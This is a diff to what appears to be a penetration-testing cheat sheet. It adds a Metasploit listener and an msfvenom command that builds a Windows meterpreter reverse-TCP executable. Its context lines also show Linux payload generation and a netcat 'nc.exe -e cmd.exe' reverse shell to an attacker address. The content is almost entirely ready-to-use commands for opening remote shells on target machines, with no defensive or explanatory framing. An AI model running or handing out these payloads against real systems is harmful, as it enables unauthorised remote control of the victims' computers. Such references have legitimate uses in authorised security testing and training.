@@ -7,7 +7,7 @@ Netcat
 
 Meterpreter Linux x64 Reverse TCP Staged
 ```
-msfconsole
+msfconsole -q
 use multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
 set lhost ipaddress
@@ -42,6 +42,23 @@ Meterpreter Linux x64 Reverse TCP Staged
 `msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=ipaddress lport=port -f elf -o shell`
 
 # Windows
+
+## Listeners
+
+Meterpreter Windows x86 Reverse TCP Staged
+```
+msfconsole -q
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost ipaddress
+set lport port
+run
+```
+
+## Payloads
+
+Meterpreter Windows x86 Reverse TCP Staged
+`msfvenom -p windows/meterpreter/reverse_tcp lhost=ipaddress lport=port -f exe > shell-x86.exe`
 
 Netcat
 `nc.exe -e cmd.exe ipaddress port`
